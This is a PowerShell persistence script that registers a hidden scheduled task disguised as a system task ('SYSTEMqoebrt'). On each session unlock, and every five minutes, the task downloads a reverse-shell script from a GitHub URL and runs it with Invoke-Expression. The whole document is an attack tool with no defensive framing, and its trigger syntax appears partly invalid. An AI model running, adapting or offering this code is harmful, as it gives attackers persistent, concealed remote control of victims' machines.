# Define the task action to run the PowerShell script from the URI
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command 'Invoke-RestMethod -Uri ''https://raw.githubusercontent.com/RacoonK1ng/Reverse-Powershell/refs/heads/main/reverse-shell.ps1'' | Invoke-Expression'"

# Define the task trigger to run when the session is unlocked (combine the two lines into one)
$trigger = New-ScheduledTaskTrigger -Type SessionStateChange -StateChange "SessionUnlock"
$trigger.RepetitionInterval = [System.TimeSpan]::FromMinutes(5)  # Repetition every 5 minutes
$trigger.StopAtDurationEnd = $false

# Define task settings (similar to those in the XML)
$settings = New-ScheduledTaskSettingsSet -AllowStartOnDemand $true -StartWhenAvailable $false -RunOnlyIfNetworkAvailable $false -WakeToRun $false -ExecutionTimeLimit (New-TimeSpan -Hours 72)

# Create the scheduled task object
$task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings

# Register the scheduled task and set it as enabled
Register-ScheduledTask -TaskName "SYSTEMqoebrt" -InputObject $task -Enabled $true


exit
